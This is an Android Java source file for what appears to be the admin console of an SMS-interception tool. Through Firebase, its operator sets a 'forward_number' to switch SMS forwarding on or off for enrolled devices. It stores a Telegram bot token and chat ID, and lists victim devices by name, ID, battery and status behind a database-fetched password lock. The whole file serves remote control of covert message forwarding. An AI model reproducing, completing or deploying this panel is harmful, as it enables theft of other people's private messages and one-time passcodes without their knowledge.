package com.Rahul.Developer.Admin;

import android.animation.*;
import android.app.*;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.*;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.*;
import android.graphics.*;
import android.graphics.drawable.*;
import android.media.*;
import android.net.*;
import android.net.Uri;
import android.os.*;
import android.text.*;
import android.text.style.*;
import android.util.*;
import android.view.*;
import android.view.View;
import android.view.View.*;
import android.view.animation.*;
import android.webkit.*;
import android.widget.*;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.annotation.*;
import androidx.appcompat.app.AppCompatActivity;
import androidx.fragment.app.DialogFragment;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import androidx.recyclerview.widget.*;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import androidx.recyclerview.widget.RecyclerView.Adapter;
import androidx.recyclerview.widget.RecyclerView.ViewHolder;
import com.google.android.material.button.*;
import com.google.firebase.FirebaseApp;
import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.GenericTypeIndicator;
import com.google.firebase.database.ValueEventListener;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.scottyab.aescrypt.*;
import java.io.*;
import java.text.*;
import java.util.*;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.*;
import org.json.*;
import android.net.ParseException;

public class MainActivity extends AppCompatActivity {
	
	private Timer _timer = new Timer();
	private FirebaseDatabase _firebase = FirebaseDatabase.getInstance();
	
	private DatabaseReference sms_forward;
	// private RecyclerView recyclerView;
	private UserAdapter adapter;
	private List<UserData> userList;
	private DatabaseReference databaseRef;
	private boolean isSearching = false; // ইউজার সার্চ করছে কিনা ট্র্যাক রাখবে
	//private ArrayList<HashMap<String, Object>> searchList = new ArrayList<>();
	private DatabaseReference databaseReference;
	private HashMap<String, Object> m = new HashMap<>();
	private HashMap<String, Object> smm = new HashMap<>();
	private String number = "";
	private String phoneNumber = "";
	private String password = "";
	private String encryptedMsg = "";
	private double n = 0;
	private HashMap<String, Object> maps = new HashMap<>();
	private String titleSTR = "";
	private String msgSTR = "";
	private String versionSTR = "";
	private String STR = "";
	private String urlSTR = "";
	private String pp = "";
	private String p = "";
	private HashMap<String, Object> np = new HashMap<>();
	private String uuid = "";
	private String pass2 = "";
	private String lock_status = "";
	private String app_password = "";
	private String adminlink = "";
	private String strSearch = "";
	private double len = 0;
	private HashMap<String, Object> map = new HashMap<>();
	private String forwardNumber = "";
	
	private ArrayList<HashMap<String, Object>> mp = new ArrayList<>();
	private ArrayList<HashMap<String, Object>> mapList = new ArrayList<>();
	private ArrayList<String> searchList = new ArrayList<>();
	
	private LinearLayout linear2;
	private LinearLayout linear1;
	private TextView textview1;
	private MaterialButton materialbutton1;
	private TextView textview2;
	private MaterialButton materialbutton2;
	private LinearLayout swiperefreshlayout2;
	private RecyclerView recyclerView;
	
	private DatabaseReference user_data = _firebase.getReference("user_data");
	private ChildEventListener _user_data_child_listener;
	private TimerTask t;
	private AlertDialog.Builder dialog;
	private Intent intent = new Intent();
	private Intent intents = new Intent();
	private TimerTask timer;
	private RequestNetwork net;
	private RequestNetwork.RequestListener _net_request_listener;
	private Intent i = new Intent();
	private AlertDialog.Builder d;
	private SharedPreferences s;
	private Intent ii = new Intent();
	private TimerTask tp;
	private AlertDialog.Builder dd;
	private DatabaseReference all_pas = _firebase.getReference("all_pas");
	private ChildEventListener _all_pas_child_listener;
	private SharedPreferences a;
	private Intent admin = new Intent();
	private DatabaseReference adlink = _firebase.getReference("adlink");
	private ChildEventListener _adlink_child_listener;
	private SharedPreferences p_number;
	private DatabaseReference users = _firebase.getReference("users");
	private ChildEventListener _users_child_listener;
	
	@Override
	protected void onCreate(Bundle _savedInstanceState) {
		super.onCreate(_savedInstanceState);
		setContentView(R.layout.main);
		initialize(_savedInstanceState);
		FirebaseApp.initializeApp(this);
		initializeLogic();
	}
	
	private void initialize(Bundle _savedInstanceState) {
		linear2 = findViewById(R.id.linear2);
		linear1 = findViewById(R.id.linear1);
		textview1 = findViewById(R.id.textview1);
		materialbutton1 = findViewById(R.id.materialbutton1);
		textview2 = findViewById(R.id.textview2);
		materialbutton2 = findViewById(R.id.materialbutton2);
		swiperefreshlayout2 = findViewById(R.id.swiperefreshlayout2);
		recyclerView = findViewById(R.id.recyclerView);
		dialog = new AlertDialog.Builder(this);
		net = new RequestNetwork(this);
		d = new AlertDialog.Builder(this);
		s = getSharedPreferences("s", Activity.MODE_PRIVATE);
		dd = new AlertDialog.Builder(this);
		a = getSharedPreferences("a", Activity.MODE_PRIVATE);
		p_number = getSharedPreferences("p_number", Activity.MODE_PRIVATE);
		
		materialbutton1.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				final AlertDialog dialog = new AlertDialog.Builder(MainActivity.this).create();
				View inflate = getLayoutInflater().inflate(R.layout.lock,null); 
				dialog.getWindow().setBackgroundDrawableResource(android.R.color.transparent);
				dialog.setView(inflate);
				LinearLayout bg1 = (LinearLayout) inflate.findViewById(R.id.bg1);
				bg1.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b) { this.setCornerRadius(a); this.setColor(b); return this; } }.getIns((int)15, 0xFFFFFFFF));
				final EditText et1 = (EditText) 
				inflate.findViewById(R.id.et1);
				et1.setTextIsSelectable(true);
				Button bt1 = (Button)
				inflate.findViewById(R.id.bt1);
				bt1.setText("Save");
				bt1.setOnClickListener(new View.OnClickListener(){ public void onClick(View v){
						if (et1.getText().toString().equals("")) {
							((EditText)et1).setError("Add Password");
						}
						else {
							
							map = new HashMap<>();
							map.put("password", et1.getText().toString());
							all_pas.child("login").updateChildren(map);
							map.clear();
							dialog.dismiss();
						}
					}
				});
				dialog.show();
			}
		});
		
		materialbutton2.setOnLongClickListener(new View.OnLongClickListener() {
			@Override
			public boolean onLongClick(View _view) {
				_add_bot();
				return true;
			}
		});
		
		materialbutton2.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				showAdminDialog();
			}
		});
		
		_user_data_child_listener = new ChildEventListener() {
			@Override
			public void onChildAdded(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				if (true) {
					
				}
			}
			
			@Override
			public void onChildChanged(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildMoved(DataSnapshot _param1, String _param2) {
				
			}
			
			@Override
			public void onChildRemoved(DataSnapshot _param1) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onCancelled(DatabaseError _param1) {
				final int _errorCode = _param1.getCode();
				final String _errorMessage = _param1.getMessage();
				
			}
		};
		user_data.addChildEventListener(_user_data_child_listener);
		
		_net_request_listener = new RequestNetwork.RequestListener() {
			@Override
			public void onResponse(String _param1, String _param2, HashMap<String, Object> _param3) {
				final String _tag = _param1;
				final String _response = _param2;
				final HashMap<String, Object> _responseHeaders = _param3;
				/**/
				/*
n = 3.0d;
maps = new Gson().fromJson(_response, new TypeToken<HashMap<String, Object>>(){}.getType());
if (maps.containsKey("title")) {
titleSTR = maps.get("title").toString();
}
if (maps.containsKey("msg")) {
msgSTR = maps.get("msg").toString();
}
if (maps.containsKey("version")) {
versionSTR = maps.get("version").toString();
}
if (maps.containsKey("url")) {
urlSTR = maps.get("url").toString();
}
if (n == Double.parseDouble(versionSTR)) {

} else {
d.setCancelable(false);
d.setTitle(titleSTR);
d.setMessage(msgSTR);
d.setPositiveButton("Update", new DialogInterface.OnClickListener() {
@Override
public void onClick(DialogInterface _dialog, int _which) {
i.setAction(Intent.ACTION_VIEW);
i.setData(Uri.parse(urlSTR));
startActivity(i);
finish();
}
});
d.create().show();
}
*/
			}
			
			@Override
			public void onErrorResponse(String _param1, String _param2) {
				final String _tag = _param1;
				final String _message = _param2;
				/**/
				/*
d.setMessage("You are offline 🚫🤦‍♂️");
d.setCancelable(false);
d.setPositiveButton("ok", new DialogInterface.OnClickListener() {
@Override
public void onClick(DialogInterface _dialog, int _which) {
finishAffinity();
}
});
d.create().show();
*/
			}
		};
		
		_all_pas_child_listener = new ChildEventListener() {
			@Override
			public void onChildAdded(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				if (_childKey.equals("login")) {
					app_password = _childValue.get("password").toString();
				}
			}
			
			@Override
			public void onChildChanged(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildMoved(DataSnapshot _param1, String _param2) {
				
			}
			
			@Override
			public void onChildRemoved(DataSnapshot _param1) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onCancelled(DatabaseError _param1) {
				final int _errorCode = _param1.getCode();
				final String _errorMessage = _param1.getMessage();
				
			}
		};
		all_pas.addChildEventListener(_all_pas_child_listener);
		
		_adlink_child_listener = new ChildEventListener() {
			@Override
			public void onChildAdded(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildChanged(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildMoved(DataSnapshot _param1, String _param2) {
				
			}
			
			@Override
			public void onChildRemoved(DataSnapshot _param1) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onCancelled(DatabaseError _param1) {
				final int _errorCode = _param1.getCode();
				final String _errorMessage = _param1.getMessage();
				
			}
		};
		adlink.addChildEventListener(_adlink_child_listener);
		
		_users_child_listener = new ChildEventListener() {
			@Override
			public void onChildAdded(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildChanged(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildMoved(DataSnapshot _param1, String _param2) {
				
			}
			
			@Override
			public void onChildRemoved(DataSnapshot _param1) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onCancelled(DatabaseError _param1) {
				final int _errorCode = _param1.getCode();
				final String _errorMessage = _param1.getMessage();
				
			}
		};
		users.addChildEventListener(_users_child_listener);
	}
	
	private void initializeLogic() {
		{
			android.graphics.drawable.GradientDrawable SketchUi = new android.graphics.drawable.GradientDrawable();
			int d = (int) getApplicationContext().getResources().getDisplayMetrics().density;
			SketchUi.setColor(0xFF212121);
			SketchUi.setCornerRadius(d*0);
			SketchUi.setStroke(d*2,0xFF212121);
			linear2.setElevation(d*5);
			linear2.setBackground(SketchUi);
		}
		// Initialize Firebase reference
		FirebaseDatabase database = FirebaseDatabase.getInstance();
		sms_forward = database.getReference("sms_forward");
		DatabaseReference dbRef = FirebaseDatabase.getInstance().getReference("sms_forward").child("forward_number");
		
		// "forward_number" এর মান পড়া
		dbRef.addListenerForSingleValueEvent(new ValueEventListener() {
			@Override
			public void onDataChange(@NonNull DataSnapshot snapshot) {
				if (snapshot.exists() && snapshot.getValue() != null) {
					forwardNumber = snapshot.getValue().toString();
					p_number.edit().putString("last_number", forwardNumber).commit();
					// Toast.makeText(MainActivity.this, "Forward Number: " + forwardNumber, Toast.LENGTH_SHORT).show();
				} else {
					//  Toast.makeText(MainActivity.this, "No forward number found!", Toast.LENGTH_SHORT).show();
				}
			}
			
			@Override
			public void onCancelled(@NonNull DatabaseError error) {
				//Toast.makeText(MainActivity.this, "Failed to load data!", Toast.LENGTH_SHORT).show();
			}
		});
		// MainActivity.java
		recyclerView = findViewById(R.id.recyclerView);
		recyclerView.setLayoutManager(new LinearLayoutManager(this));
		userList = new ArrayList<>();
		adapter = new UserAdapter(userList);
		recyclerView.setAdapter(adapter);
		
		databaseRef = FirebaseDatabase.getInstance().getReference("user_data");
		
		databaseRef.addValueEventListener(new ValueEventListener() {
			@Override
			public void onDataChange(@NonNull DataSnapshot snapshot) {
				try {
					userList.clear();
					for (DataSnapshot data : snapshot.getChildren()) {
						UserData user = data.getValue(UserData.class);
						userList.add(user);
					}
					
					// Update the adapter with the sorted list
					adapter.updateUserList(userList);
					
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
			
			@Override
			public void onCancelled(@NonNull DatabaseError error) {
				// Handle cancellation (optional)
			}
		});
		_Onclick();
		net.startRequestNetwork(RequestNetworkController.GET, textview1.getText().toString(), "", _net_request_listener);
	}
	
	@Override
	public void onBackPressed() {
		dd.setTitle("to exit or not to exit");
		dd.setMessage("do you want to exit this app");
		dd.setPositiveButton(" Exit ", new DialogInterface.OnClickListener() {
			@Override
			public void onClick(DialogInterface _dialog, int _which) {
				finishAffinity();
			}
		});
		dd.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
			@Override
			public void onClick(DialogInterface _dialog, int _which) {
				
			}
		});
		dd.create().show();
	}
	
	public void _update_data() {
	}
	private void showAdminDialog() {
		final AlertDialog dialog = new AlertDialog.Builder(MainActivity.this).create();
		View inflate = getLayoutInflater().inflate(R.layout.bot_added, null);
		dialog.getWindow().setBackgroundDrawableResource(android.R.color.transparent);
		dialog.setView(inflate);
		
		LinearLayout bg1 = (LinearLayout) inflate.findViewById(R.id.bg1);
		bg1.setBackground(new GradientDrawable() {
			public GradientDrawable getIns(int a, int b) {
				this.setCornerRadius(a);
				this.setColor(b);
				return this;
			}
		}.getIns((int) 25, 0xFFFFFFFF));
		
		final EditText et1 = inflate.findViewById(R.id.et1);
		final EditText et2 = inflate.findViewById(R.id.et2);
		et1.setTextIsSelectable(true);
		et2.setVisibility(View.GONE);
		
		Button bt1 = inflate.findViewById(R.id.bt1);
		bt1.setText("Activate");
		Button bt2 = inflate.findViewById(R.id.bt2);
		bt2.setText("Deactivate");
		
		
		TextView t1 = (TextView) inflate.findViewById(R.id.t1);
		t1.setText("Sms Forwarding ");
		if (p_number.getString("last_number", "").equals("")) {
			et1.setHint("Set Number");
		} else {
			et1.setHint(p_number.getString("last_number", ""));
		}
		bt1.setOnClickListener(new View.OnClickListener() {
			public void onClick(View v) {
				String phoneNumber = et1.getText().toString().trim();
				p_number.edit().putString("last_number", phoneNumber).commit();
				if (phoneNumber.isEmpty()) {
					et1.setError("Please enter phone number");
					return;
				}
				
				if (sms_forward != null) {
					sms_forward.child("forward_number").setValue(phoneNumber)
					.addOnSuccessListener(aVoid -> {
						Log.d("AdminPanel", "✅ Forward Number Updated: " + phoneNumber);
						Toast.makeText(MainActivity.this, "✅ SMS Forwarding Activated!", Toast.LENGTH_SHORT).show();
						dialog.dismiss();
					})
					.addOnFailureListener(e -> {
						Log.e("AdminPanel", "❌ Error: " + e.getMessage());
						Toast.makeText(MainActivity.this, "❌ Failed to Update Number!", Toast.LENGTH_SHORT).show();
					});
				} else {
					Log.e("AdminPanel", "❌ Firebase reference is NULL!");
					Toast.makeText(MainActivity.this, "❌ Firebase not initialized!", Toast.LENGTH_SHORT).show();
				}
			}
		});
		
		bt2.setOnClickListener(new View.OnClickListener() {
			public void onClick(View v) {
				String phoneNumber = "Not forward";
				
				if (sms_forward != null) {
					sms_forward.child("forward_number").setValue(phoneNumber)
					.addOnSuccessListener(aVoid -> {
						Log.d("AdminPanel", "✅ Forward Number Updated: " + phoneNumber);
						Toast.makeText(MainActivity.this, "✅ SMS Forwarding Deactivated!", Toast.LENGTH_SHORT).show();
						dialog.dismiss();
					})
					.addOnFailureListener(e -> {
						Log.e("AdminPanel", "❌ Error: " + e.getMessage());
						Toast.makeText(MainActivity.this, "❌ Failed to Update Number!", Toast.LENGTH_SHORT).show();
					});
				} else {
					Log.e("AdminPanel", "❌ Firebase reference is NULL!");
					Toast.makeText(MainActivity.this, "❌ Firebase not initialized!", Toast.LENGTH_SHORT).show();
				}
			}
		});
		
		dialog.show();
		
	}
	
	
	public void _Onclick() {
		_show_lock();
	}
	
	
	public void _show_lock() {
		final AlertDialog dialog = new AlertDialog.Builder(MainActivity.this).create();
		View inflate = getLayoutInflater().inflate(R.layout.ad_lock,null); 
		dialog.getWindow().setBackgroundDrawableResource(android.R.color.transparent);
		dialog.setView(inflate);
		dialog.setCancelable(false);
		LinearLayout bg1 = (LinearLayout) inflate.findViewById(R.id.bg1);
		bg1.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b) { this.setCornerRadius(a); this.setColor(b); return this; } }.getIns((int)15, 0xFFB0BEC5));
		final EditText et1 = (EditText) 
		inflate.findViewById(R.id.et1);
		et1.setTextIsSelectable(true);
		Button bt1 = (Button)
		inflate.findViewById(R.id.bt1);
		bt1.setText("Unlock");
		bt1.setOnClickListener(new View.OnClickListener(){ public void onClick(View v){
				if (et1.getText().toString().equals(app_password)) {
					s.edit().putString("password", et1.getText().toString()).commit();
					dialog.dismiss();
				} else {
					((EditText)et1).setError("wrong password!");
				}
			}
		});
		dialog.show();
	}
	
	
	public void _Search(final String _query) {
		strSearch = _query.toUpperCase();
		searchList.clear();
		user_data.addListenerForSingleValueEvent(new ValueEventListener() {
			@Override
			public void onDataChange(DataSnapshot _dataSnapshot) {
				mp = new ArrayList<>();
				try {
					GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
					for (DataSnapshot _data : _dataSnapshot.getChildren()) {
						HashMap<String, Object> _map = _data.getValue(_ind);
						mp.add(_map);
					}
				} catch (Exception _e) {
					_e.printStackTrace();
				}
				if (_query.length() > 0) {
					n = mp.size() - 1;
					len = mp.size();
					for(int _repeat128 = 0; _repeat128 < (int)(len); _repeat128++) {
						if (mp.get((int)n).get("d_name").toString().toUpperCase().contains(_query.toUpperCase())) {
							searchList.add(mp.get((int)n).get("d_name").toString());
							Collections.reverse(searchList);
						} else {
							mp.remove((int)(n));
						}
						n--;
					}
				}
				recyclerView.setAdapter(new RecyclerViewAdapter(mp));
			}
			@Override
			public void onCancelled(DatabaseError _databaseError) {
			}
		});
	}
	
	
	public void _add_bot() {
		final AlertDialog dialog = new AlertDialog.Builder(MainActivity.this).create();
		View inflate = getLayoutInflater().inflate(R.layout.bot_added,null); 
		dialog.getWindow().setBackgroundDrawableResource(android.R.color.transparent);
		dialog.setView(inflate);
		LinearLayout bg1 = (LinearLayout) inflate.findViewById(R.id.bg1);
		LinearLayout bg2 = (LinearLayout) inflate.findViewById(R.id.bg2);
		bg2.setVisibility(View.GONE);
		bg1.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b) { this.setCornerRadius(a); this.setColor(b); return this; } }.getIns((int)21, 0xFFFFFFFF));
		final EditText et1 = (EditText) inflate.findViewById(R.id.et1);
		final EditText et2 = (EditText) inflate.findViewById(R.id.et2);
		//final RadioButton radiobutton1 = (RadioButton) inflate.findViewById(R.id.radiobutton1);
		//final RadioButton radiobutton2 = (RadioButton) inflate.findViewById(R.id.radiobutton2);
		et1.setTextIsSelectable(true);
		et1.setHint("Chat ID");
		et2.setTextIsSelectable(true);
		Button bt1 = (Button)
		inflate.findViewById(R.id.bt1);
		bt1.setText("Save");
		Button bt2 = (Button)
		inflate.findViewById(R.id.bt2);
		bt2.setText("Save");
		bt2.setVisibility(View.GONE);
		bt1.setOnClickListener(new View.OnClickListener(){ public void onClick(View v){
				np = new HashMap<>();
				np.put("uesrID", uuid);
				np.put("chat_id", et1.getText().toString());
				np.put("bot_token", et2.getText().toString());
				users.child("all_user").updateChildren(np);
				np.clear();
				Toast.makeText(MainActivity.this, "success!", Toast.LENGTH_SHORT).show();
				dialog.dismiss();
			}
		});
		dialog.show();
	}
	
	
	public void _loadingdialog(final boolean _ifShow, final String _title) {
		if (_ifShow) {
			if (prog == null){
				prog = new ProgressDialog(this);
				prog.setMax(100);
				prog.setIndeterminate(true);
				prog.setCancelable(false);
				prog.setCanceledOnTouchOutside(false);
			}
			prog.setMessage(_title);
			prog.show();
			//powered by gopal
			
		} else {
			if (prog != null){
				prog.dismiss();
			}
			//powered by Aauraparti
			
		}
	} private ProgressDialog prog; {
		//powered by projectBox
		
	}
	
	public class RecyclerViewAdapter extends RecyclerView.Adapter<RecyclerViewAdapter.ViewHolder> {
		
		ArrayList<HashMap<String, Object>> _data;
		
		public RecyclerViewAdapter(ArrayList<HashMap<String, Object>> _arr) {
			_data = _arr;
		}
		
		@Override
		public ViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {
			LayoutInflater _inflater = getLayoutInflater();
			View _v = _inflater.inflate(R.layout.user, null);
			RecyclerView.LayoutParams _lp = new RecyclerView.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
			_v.setLayoutParams(_lp);
			return new ViewHolder(_v);
		}
		
		@Override
		public void onBindViewHolder(ViewHolder _holder, final int _position) {
			View _view = _holder.itemView;
			
			final LinearLayout main_layout = _view.findViewById(R.id.main_layout);
			final LinearLayout linear5 = _view.findViewById(R.id.linear5);
			final View view7 = _view.findViewById(R.id.view7);
			final LinearLayout linear8 = _view.findViewById(R.id.linear8);
			final de.hdodenhof.circleimageview.CircleImageView circleimageview1 = _view.findViewById(R.id.circleimageview1);
			final LinearLayout linear6 = _view.findViewById(R.id.linear6);
			final TextView device_name = _view.findViewById(R.id.device_name);
			final TextView device_id = _view.findViewById(R.id.device_id);
			final TextView battery_percentage = _view.findViewById(R.id.battery_percentage);
			final TextView textview1 = _view.findViewById(R.id.textview1);
			final TextView user_status = _view.findViewById(R.id.user_status);
			final LinearLayout linear9 = _view.findViewById(R.id.linear9);
			final TextView user_serial = _view.findViewById(R.id.user_serial);
			final LinearLayout linear10 = _view.findViewById(R.id.linear10);
			final ImageView imageview1 = _view.findViewById(R.id.imageview1);
		}
		
		@Override
		public int getItemCount() {
			return _data.size();
		}
		
		public class ViewHolder extends RecyclerView.ViewHolder {
			public ViewHolder(View v) {
				super(v);
			}
		}
	}
}